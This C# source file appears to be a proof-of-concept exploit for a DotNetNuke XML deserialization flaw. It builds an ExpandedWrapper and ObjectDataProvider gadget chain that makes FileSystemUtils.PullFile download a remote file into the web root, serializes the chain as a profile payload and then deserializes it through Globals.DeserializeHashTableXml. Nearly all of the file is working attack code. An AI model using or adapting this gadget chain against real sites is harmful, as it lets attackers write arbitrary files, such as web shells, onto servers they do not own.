using System; 
using System.IO; 
using DotNetNuke.Common.Utilities; 
using System.Collections; 
using System.Data.Services.Internal; 
using System.Windows.Data;
using DotNetNuke.Common;

// AGREGAR REFERENNCIA
// PresentationFramework.dll -> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\WPF\PresentationFramework.dll
// System.Data.Services.dll  -> C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Data.Services\v4.0_4.0.0.0_b77a5c561934e089\System.Data.Services.dll
//DotNetNuke.dll             -> C:\inetpub\wwwroot\dnn9\bin\DotNetNuke.dll
namespace ExpWrapSerializer
{ 
    class Program
    {
        static void Main(string[] args)
        {
            //Serialize(); 
            Deserialize();
        }

        public static void Deserialize()
        {
            string xmlSource = System.IO.File.ReadAllText("C:\\Users\\RICHAR\\Desktop\\ExpWrap.txt");
            Globals.DeserializeHashTableXml(xmlSource);
        }

        public static void Serialize()
        {
            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
            myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
            myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
            myExpWrap.ProjectedProperty0.MethodName = "PullFile";

            myExpWrap.ProjectedProperty0.MethodParameters.Add("http://localhost:8000/test.txt");

            myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dnn9/POC.txt");

            Hashtable table = new Hashtable();
            table["myTableEntry"] = myExpWrap;
            String payload = XmlUtils.SerializeDictionary(table, "profile");
            TextWriter writer = new
            StreamWriter("C:\\Users\\RICHAR\\Desktop\\ExpWrap.txt");
            writer.Write(payload);
            writer.Close();
            Console.WriteLine("Done!");
        }
    } 
}
